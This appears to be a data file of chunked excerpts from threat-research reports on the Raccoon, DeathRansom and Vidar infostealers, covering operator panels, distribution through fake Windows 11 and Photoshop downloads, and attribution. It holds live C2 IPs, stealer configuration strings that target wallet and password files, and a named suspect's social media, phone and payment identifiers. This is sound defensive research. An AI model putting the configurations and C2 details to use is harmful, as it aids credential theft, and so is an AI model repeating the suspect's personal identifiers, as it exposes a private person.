Conclusion Though the Raccoon stealer may not be the most innovative infostealer on the market, it is still gaining significant traction in the underground community. Based on testimonials from the underground community, The Raccoon team provides reliable customer service to give cybercriminals a quick-and-easy way to commit cybercrime without a huge personal investment. This has not come without strife. The team has faced several public disputes in underground forums, and has received some criticism from competitors. Despite this, Raccoon has quickly become one of the top ten mentioned malware in the underground community, despite being launched in early 2019. Overall, sentiment around Raccoon is positive, with some calling it the best replacement available for the now defunct Azorult infostealer. Raccoon’s popularity combined with its limited feature set yet high adoption speaks to a growing trend of the commoditization of malware, as malware authors shoot to create platforms for crime instead of committing the crimes directly. As malware authors choose to develop MaaS, they must partake in many of the same activities as a legitimate SaaS business: marketing efforts, relying on positive reviews, responsive customer support, and regularly improving features in their product. We only expect this trend to continue into 2020 and push the evolution of MaaS forward. Endpoint protection is key to defending against techniques like these.|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|62516997e42d479f979ff0f6243fead5
"APPENDIX INDICATORS OF COMPROMISE Review the Indicators of Compromise for the Raccoon Stealer here.

MITRE ATT&CK TECHNIQUES BREAKDOWN

Initial

Access

Execution

Defense

Evasion

Credential

Access

Discovery

Collection

Exfiltration

Command

and Control

Spear

Phishing

Attachment

Execution

through

API

Software

Packing

Credential

Dumping

System Time

Discovery

Data from

Local

System

Data

Encrypted

Remote File

Copy

Drive



by

Compromise

CommandLine

Interface

Deobfuscate

/ Decode

Files or

Information

Credentials

in Files

Account

Discovery

Screen

Capture

Obfuscated

Files or

Information

Input

Capture

File and

Directory

Discovery

Exploitation

for Client

Execution

Standard

Cryptographic

Protocol

Standard

NonApplication

Layer

Protocol

16/17

System

Information

Discovery

Standard

Application

Layer

Protocol

Query

Registry

Process

Discovery

System

Owner/User

Discovery

Remote

System

Discovery

System

Network

Configuration

Discovery"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|6685bcb5a90346bc9eac59cb553d3f93
"Protocol

Query

Registry

Process

Discovery

System

Owner/User

Discovery

Remote

System

Discovery

System

Network

Configuration

Discovery

About the Author Cybereason Nocturnus The Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks. All Posts by Cybereason Nocturnus

17/17"|data_input/vidar_reports/entry_c6e5d656-66e3-4a78-93bb-442185c548c5.text|c92978769f834b2ebef8ceb5e822acd6
"DeathRansom Part II: Attribution

fortinet.com/blog/threat



research/death



ransom



attribution.html

January 2, 2020

Threat Research By Artem Semenchenko and Evgeny Ananin | January 02, 2020

Introduction FortiGuard Labs recently discovered an ongoing DeathRansom malicious campaign. Our first blog on this new variant was devoted to a technical analysis of the samples that had been gathered. In this second part, we will try to shed a light on how this DeathRansom campaign is connected with other campaigns, and who might be behind them.

False Scent and Connections with Vidar Stealer False Language Lead We start our investigation with the sample 13d263fb19d866bb929f45677a9dcbb683df5e1fa2e1b856fde905629366c5e1, which was mentioned in our previous blog. This sample has debug paths, but we could not recognize the language used. In addition, it has nine resources, with a LANG_SLOVAK identifier constant (0x041B) in the resource section. This means that the sample could have been compiled on a machine with a Slovak language installed by default. Figure 1: A debug path inside the sample Figure 2. Part of the .rsrc section of the sample We tried to translate a PDB path from Slovak by splitting the words in different ways and then feeding the results to various automatic translation services. However, none of these attempts led to a correct translation. In fact, the word “duzuk” was recognized by Google Translate not as Slovak, but as Basque (for the English “you have”).

1/10"|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|83d113b87ec84183b451129c9dd2b652
"1/10

A Basque word was an intriguing lead, since this sample was downloaded from a domain in the .es domain zone (Spain). We believe that this domain was hacked, therefore we will not disclose the domain name here. The name of the sample was also interesting: Wacatac_2019-11-20_00-10.exe. The word “Wacatac” can be translated from Basque in several different meaningful ways, so we decided to dig deeper. Since the file name has a clearly distinguishable name-date-time construction, we decided to search for this pattern among all known files. Nine files were found. Their details are provided in Figure 3. Figure 3. A part of our investigation table Again, we were a little disappointed: the resource language ID’s were changed from Nepali to Slovak then to Neutral then back to Slovak at a very fast pace. In addition, the debug paths look like machine-generated gibberish rather than any paths a human programmer would use. Therefore, we had to conclude that a Basque trace was just a coincidence. However, the Slovak and Nepali traces are not. Most probably, they were intentionally inserted to mislead potential investigators."|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|ba6e9bf131c44d9da992e4c2083a0fd9
Bitbucket Profile In spite of these disappointments, these new samples also gave us an important clue. One of the samples shown on Figure 3 was downloaded not from the hacked .es site, but from a different URL: hxxp://bitbucket[. ]org/scat01/1/downloads/Wacatac_2019-11-16_14-06.exe The link was not accessible, and neither was the scat01 profile itself: Figure 4. Bitbucket message shown on an access attempt to the scat01 profile Nevertheless, when we searched for other malicious samples which attempted to access this Bitbucket directory, we found an interesting connections log from May 2019. The sample was related to the Vidar stealer malware family. Figure 5. A part of a connections log for the Vidar sample The name pattern has an obvious resemblance to our Wacatac sample: Wacatac_2019-11-20_00-10.exe scat01_2019-05-20_06-13.exe 2/10|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|a9dd83366a86432facb6991f50461151
Next, we decided to search among the connections logs for a connection by the URL mask bitbucket[. ]org/scat01/* One of the connections logs found on VirusTotal is shown on Figure 6 (sample dc9ff5148e26023cf7b6fb69cd97d6a68f78bb111dbf39039f41ed05e16708e4). Figure 6. Contacted URL via a fresh malicious sample Let’s now analyze these connections. The connections shown in the green frame should be familiar to anyone who has dealt with Vidar stealers, as they are standard Vidar libraries used to extract passwords from different browsers. The connection shown in the red frame is an attempt to access an executable file with another Wacatac name. Unfortunately, this link was not accessible during the Vidar sample sandbox analysis, therefore we don’t have a Wacatac_2019-11-16_17-03.exe sample. Nevertheless, as you may remember from our first blog, DeathRansom uses the name ‘Wacatac’ to store crypto keys in a registry. Therefore, we have strong reason to believe that the inaccessible Wacatac_2019-11-16_17-03.exe sample was another DeathRansom variant. Therefore, based on the same “malware hosting”, the same name pattern, and the fact that the Vidar sample tried to download a DeathRansom sample, we can conclude that the Vidar campaign and the DeathRansom campaign are run by the same actor, who uses scat01 as a Bitbucket profile name as well as a name for some malware samples. We decided to dig deeper and see what could be found about this scat01.|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|fab00dabd9c74319bd202397affe7897
"Following scat01 We started to look for fresh malware containing the string scat01 in it. Here is a short summary of our findings: One of the samples we found was the “Azorult” stealer malware that connects to a C2 server “scat01[.]tk”. a45a75582c4ad564b9726664318f0cccb1000005d573e594b49e95869ef25284 We also managed to find a C2 panel of “1ms0rryStealer” with the name scat01 in the Benkow “Panel Tracker” service: Figure 7. Archived record of the stealer control panel

3/10

The most important sample was found here: hxxp://gameshack[. ]ru/scat01.exe e767706429351c9e639cfecaeb4cdca526889e4001fb0c25a832aec18e6d5e06 This sample is a non-obfuscated Evrial stealer. When we check its configuration, we see the following “Owner” field: Figure 8. Malware owner field The last sample was downloaded from a root folder of the website gameshack[.]ru. This could mean that attackers somehow control this webserver. Therefore, we decided to see what else could be found on this webserver."|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|00df1ee80d084fe6b22c9442714b9309
Gameshack[. ]ru Portal We found many malicious samples, which were downloaded directly from a root folder on Gameshack[.]ru. We decided to analyze all available samples and extract any information that could help us in our investigation. Figure 9. Malicious samples downloaded from “gameshack[. ]ru” (according to VirusTotal) The malware samples “hosted” on the gameshack[. ]ru website were downloaders. This means that their purpose was to download a payload and run it. The main payload was of two types: Evrial stealer; Miner+Clipper+Stealer (Supreme miner). The Evrial stealer samples were not obfuscated and contained the same “Owner” field – “scat01”. The Supreme miner samples were obfuscated by “NULL SHIELD” (Confuser variant) and had an e-mail embedded: vitasa01[@]yandex.ru. Figure 11 shows part of the strings from the miner “Supreme.exe” (sample 1e1fcb1bcc88576318c37409441fd754577b008f4678414b60a25710e10d4251). This miner also had the Evrial stealer inside its body: Figure 10. Strings from the miner’s part of the malware As you can see, this sample uses the same iplogger service for counting the infected hosts as the DeathRansom samples (see our recent blogpost for details.) The Evrial stealer inside has the same “scat01” ownership: Figure 11. Strings from the Evrial stealer’s part of the malware 4/10|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|71f37866dd6d4ed0b7b8a4d158bafa36
As you can see, the website “gameshack[. ]ru” is controlled by attackers and they distribute malicious samples with scat01 attribution strings inside. Here is a short summary of the info about the attackers that we have found so far, including the spread of malware families associated with them: DeathRansom Vidar stealer Azorult stealer Evrial stealer 1ms0rryStealer Supreme miner As well as attribution info: scat01 nickname; vitasa01[@]yandex.ru e-mail. Control over gameshack[. ]ru It seems obvious that these attackers use a Russian email service and a Russian domain zone .ru. In addition, we must remember that DeathRansom performs a check for the system language, and it will not encrypt files if it detects locales from an ex-USSR country. In addition, when we analyze the stealers used by this group, we find that they can be purchased on Russian underground forums. Therefore, we decided to continue our search there.|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|af9635ea26734d95966371704d67e092
"Russian Underground Once we searched for “scat01” and “vidar” on the Russian underground forums, we found a person with the same nickname providing a review (in Russian) of the Vidar stealer: Figure 12. Feedback for Vidar stealer left by scat01 We found another post left by scat01 on another forum. This time it concerns the Evrial stealer. He is afraid that someone might access his logs from that Evrial stealer, as all the information goes to the malware seller’s servers. Figure 13. Complaints of scat01 regarding Evrial stealer seller Another post with a review was found on another Russian underground forum. This time the review is for Supreme miner: Figure 14. Feedback for Supreme miner

5/10"|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|3c1e2eec105849318bd3595021d0800b
"5/10

Moreover, a user with the same name was active on yet another Russian underground forum (from now on, we will refer to this underground forum as Russian underground forum #4). The user is currently banned for having multiple accounts with different names. Please pay attention to the profile picture used here. Figure 15. Scat01 profile on the Russian underground forum #4 Now, having found his/her profiles on the underground forums, we next extended our search, comparing the information. One interesting piece we discovered is a product review on Yandex.Market – the same company that provides the email service in the @yandex.ru domain. Figure 16. Review for a purchase In the review there is no text (only a score), but we can see its location. The review was made from Aksay. Aksay is a small Russian town near Rostov-on-Don (we will come back to this clue a little later). Figure 17. Aksay on Google Maps Another important clue here is the username of the reviewer account: vitasa01. Therefore, it is highly probable that this reviewer has access to the email vitasa01[@]yandex.ru, which we have seen in previous malicious samples. Figure 18. Yandex username in the URL string Also, please pay attention to the picture used in this profile. It is the same picture shown in Figure 15."|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|da0f856b41fa466c8ef0b1e95790f744
"Therefore, we have a triple match: the profile picture current username Yandex username At this point, we are pretty sure that this Yandex profile is related to the scat01 profile we found on the Russian underground forum #4 as well as to the malware distributed from gameshack[.]ru. But how can we find the possible real identity of this author? We decided to see what info we could find about gameshack[. ]ru itself.

Gameshack[. ]ru Portal We found an interesting YouTube channel that promotes the website gameshack[.]ru. The link to gameshack[. ]ru is named: “our game portal.” Figure 19. YouTube channel advertising malicious website

6/10"|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|19819c83e9cd4dea8be5f1c0dbda5fd5
"6/10

The username given here is “SoftEgorka.” “Egorka” is a diminutive for the Russian name “Egor.” The avatar picture also refers to gameshack[.]ru. Another interesting piece of information we found is a Skype link. In figure 20, you can see that it refers to the skype username SoftEgorka: Figure 20. Skype link in the YouTube profile When we searched for a “SoftEgorka” skype user, we found the following user profile on the same Russian underground forum #4. This time the username “Super info” is used. Figure 21. “Super info” profile on the Russian underground forum #4 The Skype address corresponds to the YouTube channel discussed above. The user states that he lives in Italy. Moreover, searching further for his messages, we found another confirmation that this could be true: Figure 22. The actor claims that he/she is from Italy By digging further among Super Info posts, we found an announcement about game accounts sales (Steam, WoT, Origin). Here we should note that stealers observed above are capable of stealing passwords from different games and game distribution platforms. This more indirect evidence that Super Info may be connected to the ongoing stealers campaign. Figure 23. A message with a WebMoney ID and the known skype link inside In the contacts section of the sale, you find “Skype: SoftEgorka” as well as the WebMoney ID 372443071304. This same WMID is mentioned in another post from the same user. It is also related to Steam accounts for sale."|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|b60fb742c9c9442789a2bca556526992
And this time, another skype profile is mentioned: nedugov99 Figure 24. A message with the same WMID and skype account nedugov99 Searching again, this time for this new Skype ID, an old advertisement for the sale of a game account shows up: Figure 25. Old advertisement of a game account for sale Here, we can see several important pieces of information: User name: undefined_Nedugov The skype id: nedugov99 The phone: +7951****311 Vkontakte SNS id: id154704666 7/10|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|981151e9e2b24e35b0ad8a1f02b78a10
We checked the mobile phone number and it belongs to the Rostov-on-Don region. Next, we checked out the VK id154704666 profile: Figure 26. Vkontakte SNS profile of Egor Nedugov The name “Egor” corresponds to one of the underground nicknames, “SoftEgorka,” and the surname “Nedugov” corresponds to the Skype account “nedugov99”. According to the profile, this individual lives in Rostov-on-Don. Remember that the Yandex review made by scat01 was done from Aksay – a small town near Rostov-on-Don. And even more interesting, he is following (or maybe even administrating?) the “Gameshack[. ]ru official group”. The link to the same group is found in the YouTube profile shown in Figures 20-21. Figure 27. “Egor Nedugov” is following the malicious website VK group Here an astute reader might ask: “Rostov-on-Don? But what about Italy, mentioned in Figures 21-22?” To get an answer, we have to visit Egor’s Instagram page: Figure 28. Instagram account of Egor Nedugov As we might learn from his Instagram and Facebook accounts, he indeed lived in Italy for some time. There is one more thing here. At this point in the investigation, we asked ourselves: “what if scat01 and SoftEgorka are different actors? The former one compiles malware and the later one “hosts” it on Gameshack[. ]ru portal?” Obviously, we have connections via gameshack[. ]ru and geographical connections, but what if they are friends and live in the same region? Well, we found yet another clue: the profile on csgo-stats[.|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|2cb09e7e28304a33b400c102ab85d8cd
"]net is shown in Figure 29. The user with the username scat01 names himself as Egor (Russian: Егор). We must note that the name “Egor” is rare in Russia. Figure 29. Scat01 profile on csgo-stats[. ]net We also found many other profiles of the same actor. According to information on underground forums, this person is responsible for account stealing, carding, malware distribution, and even the phishing and scamming of his forum mates. That is why nearly all his accounts on underground forums were eventually banned.

Conclusion

8/10

FortiGuard Labs established a significant connection between the ongoing DeathRansom and Vidar malware campaigns. They share the naming pattern and infrastructure used. We also found evidence that a Vidar sample tried to download the DeathRansom malware. We believe that an actor with the nickname scat01 could be responsible for the latest DeathRansom attack, as well as other malicious attacks. We also found evidence of strong Russian roots in the malware being distributed. Based on the evidence left on Russian underground forums, we were able to find a person who seems to likely be behind these malicious campaigns."|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|e4be62f08dcf440ebf04429ea94f26f5
"Solution All samples mentioned in this article are detected by the FortiGuard antivirus engine: 05b762354678004f8654e6da38122e6308adf3998ee956566b8f5d313dc0e029 W32/Kryptik.GYME!tr 0cf124b2afc3010b72abdc2ad8d4114ff1423cce74776634db4ef6aaa08af915 W32/Kryptik.GYQI!tr 13d263fb19d866bb929f45677a9dcbb683df5e1fa2e1b856fde905629366c5e1 W32/Kryptik.ANT!tr 2b9c53b965c3621f1fa20e0ee9854115747047d136529b41872a10a511603df8 W32/GenKryptik.DYFO!tr 4bc383a4daff74122b149238302c5892735282fa52cac25c9185347b07a8c94c W32/GenKryptik.DYBP!tr 6247f283d916b1cf0c284f4c31ef659096536fe05b8b9d668edab1e1b9068762 W32/GenKryptik.DXWB!tr 66ee3840a9722d3912b73e477d1a11fd0e5468769ba17e5e71873fd519e76def W32/Kryptik.GYMH!tr dc9ff5148e26023cf7b6fb69cd97d6a68f78bb111dbf39039f41ed05e16708e4 W32/GenKryptik.DXWQ!tr f78a743813ab1d4eee378990f3472628ed61532e899503cc9371423307de3d8b W32/GenKryptik.DXWH!tr fedb4c3b0e080fb86796189ccc77f99b04adb105d322bddd3abfca2d5c5d43c8 W32/Kryptik.GYQI!tr a45a75582c4ad564b9726664318f0cccb1000005d573e594b49e95869ef25284 W32/Generic!tr.pws e767706429351c9e639cfecaeb4cdca526889e4001fb0c25a832aec18e6d5e06 MSIL/Agent.QJH!tr 1e1fcb1bcc88576318c37409441fd754577b008f4678414b60a25710e10d4251 MSIL/CoinMiner.AHY!tr The FortiGuard Web Filtering service blocks the following URLs as malicious:

9/10

iplogger[. ]org/1Zqq77

bitbucket[. ]org/scat01/

scat01.mcdir[. ]ru

gameshack[. ]ru

scat01[. ]tk

IOC

SHA256:

05b762354678004f8654e6da38122e6308adf3998ee956566b8f5d313dc0e029"|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|57b94100298a44f09a60b2f179743330
"scat01.mcdir[. ]ru

gameshack[. ]ru

scat01[. ]tk

IOC

SHA256:

05b762354678004f8654e6da38122e6308adf3998ee956566b8f5d313dc0e029

0cf124b2afc3010b72abdc2ad8d4114ff1423cce74776634db4ef6aaa08af915

13d263fb19d866bb929f45677a9dcbb683df5e1fa2e1b856fde905629366c5e1

2b9c53b965c3621f1fa20e0ee9854115747047d136529b41872a10a511603df8

4bc383a4daff74122b149238302c5892735282fa52cac25c9185347b07a8c94c

6247f283d916b1cf0c284f4c31ef659096536fe05b8b9d668edab1e1b9068762

66ee3840a9722d3912b73e477d1a11fd0e5468769ba17e5e71873fd519e76def

dc9ff5148e26023cf7b6fb69cd97d6a68f78bb111dbf39039f41ed05e16708e4

f78a743813ab1d4eee378990f3472628ed61532e899503cc9371423307de3d8b

fedb4c3b0e080fb86796189ccc77f99b04adb105d322bddd3abfca2d5c5d43c8

a45a75582c4ad564b9726664318f0cccb1000005d573e594b49e95869ef25284

e767706429351c9e639cfecaeb4cdca526889e4001fb0c25a832aec18e6d5e06

1e1fcb1bcc88576318c37409441fd754577b008f4678414b60a25710e10d4251

URL: iplogger[. ]org/1Zqq77 bitbucket[. ]org/scat01/ scat01.mcdir[. ]ru gameshack[. ]ru scat01[. ]tk Learn more about FortiGuard Labs and the FortiGuard Security Services portfolio. Sign up for our weekly FortiGuard Threat Brief. Read about the FortiGuard Security Rating Service, which provides security audits and best practices.

Related Posts Copyright © 2022 Fortinet, Inc. All Rights Reserved Terms of ServicesPrivacy Policy | Cookie Settings 10/10"|data_input/vidar_reports/entry_8046bc8c-57c9-477c-a967-5560a7c39f23.text|467820c2b69642b192fea54c4bad211b
"CyOps Lighthouse: Vidar Stealer

cynet.com/blog/cyops



lighthouse



vidar



stealer/

January 12, 2023

The Darknet is home to many underground hacking forums. In these forums, cybercriminals talk freely: Sharing stories, tactics, success stories, and failures. Their conduct allows us to peek into the politics and ethics of those groups and actors, as they talk about recent activities. CyOps Lighthouse aims to shed a light on those dark places. Apart from the underground forums, we will also provide information regarding ongoing ransomware groups’ publications and worthy mentions from the last month.

Vidar Stealer – the attacker’s perspective Executive summary: Vidar stealer is a malware that is offered for sale in the MAAS (Malware as a service) model. It is present since 2018, and it is a variant of the “Arkei stealer”. Vidar is currently one of the top stealers that are available for sale and is responsible for a large sum of compromised credentials offered for sale on underground forums and marketplaces.

Analysis:

1/9

Vidar stealer works as a MAAS, but unlike other stealers where buyers need to set their C2 and operate from it, all Vidar admin operations are done via a dedicated website, that can be accessed either with a dedicated Onion address or a regular “Clearnet” website, when entering the main URL we are greeted with the following:"|data_input/vidar_reports/entry_23fdea56-2511-4a78-9479-a52211b01e52.text|6f5a0e72346b49b59ff3565373a36430
"An ode to Vidar, son of Odin and the god of vengeance. Once we add the “Login” prompt to the URL, we can see Vidar’s operator login page: Upon successful login, we will be greeted with the main Vidar panel:

2/9

3/9

The default login will show us the “Dashboard”, a summary of all the operations taken by the operator, the number of infected machines, geolocation, Builder version (Updates automatically), the current funds available at the crypto wallet, and all the stealers’ options and possibilities on the left. The “Logs” section is divided into several subcategories:

“All logs” is like the dashboard, it will show all logs in a given timeframe, with emphasis on the log contents:

“Files” will show all files that were exfiltrated by the stealer:

4/9

“Passwords” is self-explanatory, and “Logs for download” will show all logs that are ready for download. As Vidar aims to be a “One stop shop”, it also provides the operators with a “Services” panel, where they can filter and sign in directly to any SMTP/Banking/Cpanels/WordPress websites that were found in the logs. Moving over the “Workers” (Active bots) and “Statistics”, the settings panel is one of the most important assets of an operator. Under the main page, an operator can decide what assets to target on the infected host, as well as set rules for “Grabber” – file exfiltration module, or “Loader” – set a rule for a followup activity on infected hosts. Settings:"|data_input/vidar_reports/entry_23fdea56-2511-4a78-9479-a52211b01e52.text|45da3b82e9b74310990f44a534aaabe6
"Grabber (Specify files type, max size, and folders to exfiltrate data):

5/9

Loader:

6/9

The “Builder” tab related to creating an executable from the panel, can be adjusted to set multiple running campaigns with different targets in mind, it also includes all the “Builder updates” – any constant updates that are pushed by the Vidar team:

7/9

The builder tab is also where operators activate their subscription, according to the required timeframe:

Conclusion: Vidar is among the top info stealers on the MAAS market.

8/9

It offers multiple “Follow up” activities as seen above, and all in the same Operator panel, this makes their pricing a bit higher than other info stealers, but as the operation is going for a long period, Vidar has already amassed a reputation of a reliable malware. As we noticed in May 2022, Vidar is also one of the main sources for info stealer logs on underground markets like “Russian Marketplace”:

Vidar, like other info stealers, is not “just” a stealer, it is responsible for most compromised credentials offered on the darknet and can also be used as a loader for Ransomware to follow up after a successful infection. We strongly believe that unless an OPSEC mistake was to happen from the Vidar team, they will remain a top threat to reckon with in 2023.

9/9"|data_input/vidar_reports/entry_23fdea56-2511-4a78-9479-a52211b01e52.text|e5d51cc404ba473fb1ad0584c21fe5db
"Microsoft Windows 11 help Files have Vidar Spyware zscaler.com/blogs/security-research/vidar-distributed-through-backdoored-windows-11-downloads-and-abusing

Summary In April 2022, ThreatLabz discovered several newly registered domains, which were created by a threat actor to spoof the official Microsoft Windows 11 OS download portal. We discovered these domains by monitoring suspicious traffic in our Zscaler cloud. The spoofed sites were created to distribute malicious ISO files which lead to a Vidar infostealer infection on the endpoint. These variants of Vidar malware fetch the C2 configuration from attacker-controlled social media channels hosted on Telegram and Mastodon network. ThreatLabz believes that the same threat actor is actively leveraging social engineering to impersonate popular legitimate software applications to distribute Vidar malware, as we have also identified an attacker-controlled GitHub repository which hosts several backdoored versions of Adobe Photoshop. These binaries hosted on GitHub, distribute Vidar malware using similar tactics of abusing social media channels for C2 communication. In this blog, ThreatLabz analyzes the Vidar distribution vector, threat actor correlation, and technical analysis of the binaries involved in this campaign."|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|329bb996d61749ab9264cf7478483c56
"Key points ThreatLabz discovered several newly registered domains spoofing the official Microsoft Windows 11 OS download portal The spoofed domains were distributing malicious ISO files containing samples of the Vidar infostealer malware The actual C2s used by the malware samples are obtained from attacker-controlled social media channels hosted on Telegram and Mastodon network Using data obtained from this campaign, ThreatLabz was also able to identify another similar one using backdoored versions of Adobe Photoshop

Distribution Vector - Windows 11 Theme The threat actor registered several domains beginning 20th April 2022 that host web pages that masquerade as the official Microsoft Windows 11 download page, which is the latest version of the operating system. ThreatLabz found several other domains registered by this threat actor similar to the one shown below in Figure 1. All of these domains were used to spread malicious ISO files spoofed as a Windows 11 download.

1/13

Figure 1: Vidar attacker-controlled domain serving malicious ISO file The complete list of domains linked to this threat actor that were used in this campaign are mentioned in the Indicators of Compromise (IOC) section."|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|7f25d8f6b93b43a8a0279ae16d8adeb0
"Technical Analysis ISO file The binary inside the ISO file is a PE32 binary. The size of the ISO file is very large (more than 300 MB), which helps the attackers evade network security products where there is a file size limitation in place. Example MD5 hashes for this campaign are shown below: ISO file MD5 hash: 52c47fdda399b011b163812c46ea94a6 PE32 file MD5 hash: 6352540cf679dfec21aff6bd9dee3770 The binary inside the ISO file is digitally signed with a certificate by AVAST. However, this certificate is expired and hence invalid. Figure 2 shows the details of the certificate and the corresponding serial number.

2/13

Figure 2: Details of the certificate used to sign the malicious Vidar binary All of the binaries in this campaign were signed by a certificate with the same serial number. By pivoting on this serial number, we were able to discover several other malicious binaries from multiple different campaigns and actors, which likely indicates that this is a stolen certificate coming from the AVAST compromise back in 2019."|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|152227f6351b42e6afe6a5685b3d5986
"Vidar Samples The Vidar samples in these campaigns are all packed with Themida (except for the MD5 hash 6ae17cb76cdf097d4dc4fcccfb5abd8a) and over 330MB in size. However, the sample contains a PE file that is only around 3.3MB. Figure 3 shows that the rest of the file content is just artificially filled up with 0x10 bytes to increase the file’s size. The Vidar strings extracted from these samples is provided in the Appendix section at the end of the blog.

Figure 3: Padding of bytes to inflate the Vidar binary size from 3.3MB to 330MB All of the binaries below are related to the same Windows 11 theme campaign:

3/13

MD5: 6352540cf679dfec21aff6bd9dee3770"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|0a26e73501c3410ca4bc8d1089c3d8e9
"3/13

MD5: 6352540cf679dfec21aff6bd9dee3770

The Vidar static configuration below contains the embedded parameters needed by the sample to communicate with its C2 and information including the malware version: Profile: 670 Profile ID: 739 Version: 51.9 URL marker: hello URL1: https://t.me/btc20220425 Real C2: 195.201.250.209 (Carved out from URL1) URL2: https://ieji.de/@ronxik213 Real C2: 107.189.11.124 (Carved out from URL2) The botnet can be identified by its profile ID. Both of the hardcoded URLs are from social media sites. However, they are used as a dead drop resolver as a first stage. The URL marker instructs Vidar to parse the second stage URL from the social media profiles located at the dead drop resolver. The following is an example Vidar stealer configuration downloaded from the C2: 1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*."|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|4e1da58da88a446cbf7d314f7c448923
"MD5: da82d43043c101f25633c258f527c9d5 MD5: e9a3562f3851dd2dba27f90b5b2d15c0 Vidar static configuration: Profile: 1281 Profile ID: 755 Version: 51.9 URL marker: hello URL1: 5.252.178.50 URL2: https://koyu.space/@ronxik123 Real C2: 107.189.11.124 (Carved out from URL2) For these samples, the URL1 field in the static configuration is a real C2, and a social media profile is used as a backup URL. The Vidar stealer configuration downloaded from this C2 was the following: 1,1,0,1,1,1,1,0,0,1,250,none; This configuration is customized to extract social media passwords with all of the other Vidar features disabled. The libraries downloaded from the C2 are the same as the previous sample with the same update.zip (66cf4ebdceedecd9214caab7ca87908d).

Distribution Vector - Adobe Photoshop Theme ThreatLabz also identified an attacker-controlled GitHub repository which hosts backdoored versions of the application Adobe Photoshop Creative Cloud, which we attribute to the same threat actor. Figure 4 shows the GitHub repository (https://github.com/AdobeInstal) used by the attacker to host a backdoored version of Adobe Photoshop.

4/13

Figure 4: Vidar attacker



controlled GitHub repository

Technical Analysis The sample with the MD5 hash below belongs to this Adobe Photoshop theme campaign."|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|e4c4620c8e28431e99cc83d5536fb6d1
"controlled GitHub repository

Technical Analysis The sample with the MD5 hash below belongs to this Adobe Photoshop theme campaign.

MD5 6ae17cb76cdf097d4dc4fcccfb5abd8a Vidar static configuration: Profile: 1199 Profile ID: 0 Version: 51.8 URL marker: hello URL1: https://t.me/mm20220428 Real C2: 195.201.250.209 (Carved out from URL1) URL2: https://koyu.space/@ronxik123 Real C2: 107.189.11.124 (Carved out from URL2) The Vidar stealer configuration downloaded from the C2 was the following: 1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*. *:*cryp The libraries downloaded from the C2 are the same as the previous sample with the same update.zip (66cf4ebdceedecd9214caab7ca87908d).

Social media abuse for C2 communication All the binaries involved in this campaign fetch the IP addresses of the C2 servers from attacker-registered social media accounts on the Telegram and Mastodon networks. In the past, the threat actors distributing Vidar have abused other social media networks such as Mastodon. However, the abuse of Telegram is a new tactic that they added to their arsenal."|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|6ac6d85383364ec9982cd212e0538262
"Telegram abuse In these campaigns, the threat actor created several Telegram channels with the C2 IP address in the channel description. The format used to store the C2 IP address on social media profiles is the following for this campaign: <C2_Url_Marker> <C2_IP_address>| The C2_Url_Marker field in these campaigns was hello. The naming convention for the Telegram channels includes a date that corresponds to the date when these channels were created. As an example, the channel with the handle btc20220425 corresponds to a channel created on April 25, 2022, using btc_stacking as the name as shown in Figure 5.

5/13

Figure 5: Vidar attacker-controlled Telegram channel with the C2 IP address included in the channel description

Mastodon network abuse The Mastodon network is a decentralized social network which allows anyone to deploy their own instance of a self-hosted online community. There are several instances of such online communities on the Internet, which are built using Mastodon. Two such instances are ieji[. ]de and koyu[.]space. The threat actor created a profile on both of these communities and stored the C2 IP address in the profile section using a format similar to the one used for Telegram channels. Figure 6 and Figure 7 show the profiles created by the threat actor on ieji[. ]de and koyu[. ]space, respectively.

6/13

Figure 6: Vidar attacker-controlled profile on the Mastodon community ieji[. ]de with the C2 IP address included in the channel description"|data_input/vidar_reports/entry_4117d136-74d4-4f7c-982f-a92d989445c1.text|308eed86b79646b1ab42f53ffa6d47f8
"6/13

Figure 6: Vidar attacker-controlled profile on the Mastodon community ieji[. ]de with the C2 IP address included in the channel description

Figure 7: Vidar attacker-controlled profile on Mastodon community koyu[. ]space with the C2 IP address included in the channel description

